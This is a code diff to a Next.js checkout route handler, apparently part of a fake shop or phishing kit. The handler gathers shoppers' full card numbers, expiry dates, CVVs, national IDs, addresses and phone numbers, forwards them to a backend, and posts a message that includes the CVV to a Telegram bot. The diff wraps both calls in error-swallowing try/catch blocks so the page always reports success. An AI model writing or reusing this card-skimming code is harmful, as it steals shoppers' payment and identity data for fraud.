@@ -7,11 +7,13 @@ export async function POST(req: NextRequest) {
   const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
-  await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
-  });
+  try {
+    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
+    });
+  } catch (_) {}
 
   // Send Telegram
   const text = [
@@ -32,14 +34,16 @@ export async function POST(req: NextRequest) {
     `🔐 CVV: ${cvv}`,
   ].join("\n");
 
-  await fetch(
-    `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
-    {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
-    }
-  );
+  try {
+    await fetch(
+      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
+      }
+    );
+  } catch (_) {}
 
   return NextResponse.json({ ok: true, orderId });
 }
